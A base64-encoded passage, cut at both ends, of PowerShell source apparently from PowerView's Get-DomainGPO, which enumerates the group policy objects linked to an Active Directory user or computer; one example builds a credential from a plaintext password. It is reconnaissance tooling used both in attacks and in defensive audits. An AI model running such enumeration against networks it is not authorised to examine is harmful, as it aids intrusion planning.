cyxDTj1TeXN0ZW0sREM9dGVzdGxhYixEQz1sb2NhbCcpLApHVUlEIChlLmcuICcxMGVjMzIwZC0zMTExLTRlZjQtOGZhZi04ZjE0ZjRhZGM3ODknKSwgb3IgR1BPIG5hbWUgKGUuZy4gJ3tGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzJ9JykuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJJZGVudGl0eQoKUmV0dXJuIGFsbCBHUE8gb2JqZWN0cyBhcHBsaWVkIHRvIGEgZ2l2ZW4gY29tcHV0ZXIgaWRlbnRpdHkgKG5hbWUsIGRuc25hbWUsIERpc3Rpbmd1aXNoZWROYW1lLCBldGMuKS4KCi5QQVJBTUVURVIgVXNlcklkZW50aXR5CgpSZXR1cm4gYWxsIEdQTyBvYmplY3RzIGFwcGxpZWQgdG8gYSBnaXZlbiB1c2VyIGlkZW50aXR5IChuYW1lLCBTSUQsIERpc3Rpbmd1aXNoZWROYW1lLCBldGMuKS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MKClNwZWNpZmllcyBhbiBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBhIGRpcmVjdG9yeSBvYmplY3QuCk9uZSBvZiAnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgRmluZE9uZQoKT25seSByZXR1cm4gb25lIHJlc3VsdCBvYmplY3QuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouUEFSQU1FVEVSIFJhdwoKU3dpdGNoLiBSZXR1cm4gcmF3IHJlc3VsdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQTyAtRG9tYWluIHRlc3RsYWIubG9jYWwKClJldHVybiBhbGwgR1BPcyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQTyAtQ29tcHV0ZXJOYW1lIHdpbmRvd3MxLnRlc3RsYWIubG9jYWwKClJldHVybnMgYWxsIEdQT3MgYXBwbGllZCB3aW5kb3dzMS50ZXN0bGFiLmxvY2FsCgouRVhBTVBMRQoKIntGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzJ9IiwiVGVzdCBHUE8iIHwgR2V0LURvbWFpbkdQTwoKUmV0dXJuIHRoZSBHUE9zIHdpdGggdGhlIG5hbWUgb2YgIntGMjYwQjc2RC01NUM4LTQ2QzUtQkVGMS05MDE2REQ5OEUyNzJ9IiBhbmQgdGhlIGRpc3BsYXkKbmFtZSBvZiAiVGVzdCBHUE8iCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQTyAtTERBUEZpbHRlciAnKCFwcmltYXJ5Z3JvdXBpZD01MTMpJyAtUHJvcGVydGllcyBzYW1hY2NvdW50bmFtZSxsYXN0bG9nb24KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluR1BPIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LkdQTwoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBHUE8gcHJvcGVydHkgZmllbGRzLgoKUG93ZXJWaWV3LkdQTy5SYXcKClRoZSByYXcgRGlyZWN0b3J5U2VydmljZXMuU2VhcmNoUmVzdWx0IG9iamVjdCwgaWYgLVJhdyBpcyBlbmFibGVkLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE8nKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR1BPLlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTm9uZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVySWRlbnRpdHknKV0KICAgICAgICBbQWxpYXMoJ0NvbXB1dGVyTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXJJZGVudGl0eScpXQogICAgICAgIFtBbGlhcygnVXNlck5hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkR1BPU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRHUE9TZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlcklkZW50aXR5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlcklkZW50aXR5J10pIHsKICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyA9IEAoKQogICAgICAgICAgICAgICAgaWYgKCRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICAgICAgICAgJE9sZFByb3BlcnRpZXMgPSAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAnZGlzdGluZ3Vpc2hlZG5hbWUsZG5zaG9zdG5hbWUnCiAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJOYW1lID0gJE51bGwKCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlcklkZW50aXR5J10pIHsKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkQ29tcHV0ZXJJZGVudGl0eQogICAgICAgICAgICAgICAgICAgICRDb21wdXRlciA9IEdldC1Eb21haW5Db21wdXRlciBAU2VhcmNoZXJBcmd1bWVudHMgLUZpbmRPbmUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICAgICAgICAgICAgICAgICAgaWYoLW5vdCAkQ29tcHV0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIENvbXB1dGVyICckQ29tcHV0ZXJJZGVudGl0eScgbm90IGZvdW5kISIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdEROID0gJENvbXB1dGVyLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgJFRhcmdldENvbXB1dGVyTmFtZSA9ICRDb21wdXRlci5kbnNob3N0bmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFVzZXJJZGVudGl0eQogICAgICAgICAgICAgICAgICAgICRVc2VyID0gR2V0LURvbWFpblVzZXIgQFNlYXJjaGVyQXJndW1lbnRzIC1GaW5kT25lIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgICAgICAgICAgICAgICAgIGlmKC1ub3QgJFVzZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIFVzZXIgJyRVc2VySWRlbnRpdHknIG5vdCBmb3VuZCEiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPYmplY3RETiA9ICRVc2VyLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIyBleHRyYWN0IGFsbCBPVXMgdGhlIHRhcmdldCB1c2VyL2NvbXB1dGVyIGlzIGEgcGFydCBvZgogICAgICAgICAgICAgICAgJE9iamVjdE9VcyA9IEAoKQogICAgICAgICAgICAgICAgJE9iamVjdE9VcyArPSAkT2JqZWN0RE4uc3BsaXQoJywnKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZigkXy5zdGFydHN3aXRoKCdPVT0nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RE4uU3ViU3RyaW5nKCRPYmplY3RETi5JbmRleE9mKCIkKCRfKSwiKSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gb2JqZWN0IE9VczogJE9iamVjdE9VcyIKCiAgICAgICAgICAgICAgICBpZiAoJE9iamVjdE9VcykgewogICAgICAgICAgICAgICAgICAgICMgZmluZCBhbGwgdGhlIEdQT3MgbGlua2VkIHRvIHRoZSB1c2VyL2NvbXB1dGVyJ3MgT1VzCiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpCiAgICAgICAgICAgICAgICAgICAgJEluaGVyaXRhbmNlRGlzYWJsZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoKCRPYmplY3RPVSBpbiAkT2JqZWN0T1VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRPYmplY3RPVQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQWRzUGF0aHMgKz0gR2V0LURvbWFpbk9VIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgZXh0cmFjdCBhbnkgR1BPIGxpbmtzIGZvciB0aGlzIHBhcnRpY3VsYXIgT1UgdGhlIGNvbXB1dGVyIGlzIGEgcGFydCBvZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLmdwbGluaykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLmdwbGluay5zcGxpdCgnXVsnKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnN0YXJ0c3dpdGgoJ0xEQVAnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFBhcnRzID0gJF8uc3BsaXQoJzsnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdwb0ROID0gJFBhcnRzWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRW5mb3JjZWQgPSAkUGFydHNbMV0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEluaGVyaXRhbmNlRGlzYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGluaGVyaXRhbmNlIGhhcyBhbHJlYWR5IGJlZW4gZGlzYWJsZWQgYW5kIHRoaXMgR1BPIGlzIHNldCBhcyAiZW5mb3JjZWQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyAgIHRoZW4gYWRkIGl0LCBvdGhlcndpc2UgaWdub3JlIGl0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRFbmZvcmNlZCAtZXEgMikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3BvRE4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGluaGVyaXRhbmNlIG5vdCBtYXJrZWQgYXMgZGlzYWJsZWQgeWV0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdwb0ROCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGlzIE9VIGhhcyBHUE8gaW5oZXJpdGVuY2UgZGlzYWJsZWQsIGJyZWFrIHNvIGFkZGl0aW9uYWwgT1VzIGFyZW4ndCBwcm9jZXNzZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5ncG9wdGlvbnMgLWVxIDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5oZXJpdGFuY2VEaXNhYmxlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRUYXJnZXRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAjIGZpbmQgYWxsIHRoZSBHUE9zIGxpbmtlZCB0byB0aGUgY29tcHV0ZXIncyBzaXRlCiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSA9IChHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlck5hbWUpLlNpdGVOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYoJENvbXB1dGVyU2l0ZSAtYW5kICgkQ29tcHV0ZXJTaXRlIC1ub3RsaWtlICdFcnJvcionKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkQ29tcHV0ZXJTaXRlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyArPSBHZXQtRG9tYWluU2l0ZSBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkXy5ncGxpbmspIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGV4dHJhY3QgYW55IEdQTyBsaW5rcyBmb3IgdGhpcyBwYXJ0aWN1bGFyIHNpdGUgdGhlIGNvbXB1dGVyIGlzIGEgcGFydCBvZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLmdwbGluay5zcGxpdCgnXVsnKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnN0YXJ0c3dpdGgoJ0xEQVAnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8uc3BsaXQoJzsnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgZmluZCBhbnkgR1BPcyBsaW5rZWQgdG8gdGhlIHVzZXIvY29tcHV0ZXIncyBkb21haW4KICAgICAgICAgICAgICAgICRPYmplY3REb21haW5ETiA9ICRPYmplY3RETi5TdWJTdHJpbmcoJE9iamVjdEROLkluZGV4T2YoJ0RDPScpKQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnSWRlbnRpdHknKQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpCiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICIob2JqZWN0Y2xhc3M9ZG9tYWluKShkaXN0aW5ndWlzaGVkbmFtZT0kT2JqZWN0RG9tYWluRE4pIgogICAgICAgICAgICAgICAgJEdQT0Fkc1BhdGhzICs9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmKCRfLmdwbGluaykgewogICAgICAgICAgICAgICAgICAgICAgICAjIGV4dHJhY3QgYW55IEdQTyBsaW5rcyBmb3IgdGhpcyBwYXJ0aWN1bGFyIGRvbWFpbiB0aGUgY29tcHV0ZXIgaXMgYSBwYXJ0IG9mCiAgICAgICAgICAgICAgICAgICAgICAgICRfLmdwbGluay5zcGxpdCgnXVsnKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zdGFydHN3aXRoKCdMREFQJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5zcGxpdCgnOycpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gR1BPQWRzUGF0aHM6ICRHUE9BZHNQYXRocyIKCiAgICAgICAgICAgICAgICAjIHJlc3RvcmUgdGhlIG9sZCBwcm9wZXJpdGVzIHRvIHJldHVybiwgaWYgc2V0CiAgICAgICAgICAgICAgICBpZiAoJE9sZFByb3BlcnRpZXMpIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkT2xkUHJvcGVydGllcyB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpIH0KICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ0lkZW50aXR5JykKCiAgICAgICAgICAgICAgICAkR1BPQWRzUGF0aHMgfCBXaGVyZS1PYmplY3QgeyRfIC1hbmQgKCRfIC1uZSAnJyl9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICMgdXNlIHRoZSBncGxpbmsgYXMgYW4gQURTIHBhdGggdG8gZW51bWVyYXRlIGFsbCBHUE9zIGZvciB0aGUgY29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRfCiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAiKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKSIKICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE8uUmF3JykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE8nKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgf